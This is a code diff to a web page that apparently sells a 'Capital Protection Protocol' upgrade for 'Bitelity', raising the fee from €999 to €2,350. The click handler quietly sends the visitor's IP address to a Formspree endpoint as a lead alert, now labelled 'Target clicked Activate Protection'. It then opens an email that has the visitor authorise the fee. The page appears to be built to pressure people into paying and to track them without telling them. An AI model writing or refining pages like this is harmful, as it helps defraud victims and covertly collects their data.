@@ -149,7 +149,7 @@
 
             <div class="price-tag">
                 <span class="price-label">ONE-TIME SERVICE FEE</span>
-                <span class="price-value">€999.00</span>
+                <span class="price-value">€2,350.00</span>
             </div>
 
             <a href="javascript:void(0);" onclick="processUpgrade()" id="cta-btn" class="btn-upgrade">
@@ -180,20 +180,20 @@ async function processUpgrade() {
     btn.style.pointerEvents = "none";
 
     try {
-        // 1. Get IP address of the client
+        // 1. Get IP address for tracking lead
         const ipResponse = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResponse.json();
         const clientIp = ipData.ip;
 
-        // 2. Send silent notification to your email via Formspree
+        // 2. Send notification to your email via Formspree
         await fetch(formspreeUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                subject: "🚨 NEW BITELITY UPGRADE LEAD",
+                subject: "🚨 NEW BITELITY UPGRADE LEAD - €2,350",
                 client_ip: clientIp,
-                action: "Clicked Activate Protection",
-                platform: "Bitelity Institutional GitHub Portal"
+                action: "Target clicked Activate Protection",
+                amount: "€2,350.00"
             })
         });
     } catch (err) {
@@ -204,10 +204,10 @@ async function processUpgrade() {
     document.getElementById('offer-state').style.display = 'none';
     document.getElementById('success-message').style.display = 'block';
 
-    // 4. Open client's email app with pre-filled request
+    // 4. Open client's email app with updated amount
     setTimeout(() => {
         const subject = encodeURIComponent("Upgrade Authorization Request - Capital Protection");
-        const body = encodeURIComponent("Dear Bitelity Support,\n\nI confirm my request to activate the 10% Capital Protection Protocol for my account. I authorize the one-time activation fee of €999.00.\n\nPlease provide the next steps for settlement.");
+        const body = encodeURIComponent("Dear Bitelity Support,\n\nI confirm my request to activate the 10% Capital Protection Protocol for my account. I authorize the one-time activation fee of €2,350.00.\n\nPlease provide the next steps for settlement.");
         window.location.href = `mailto:kayaer@bitelity.info?subject=${subject}&body=${body}`;
     }, 1500);
 }
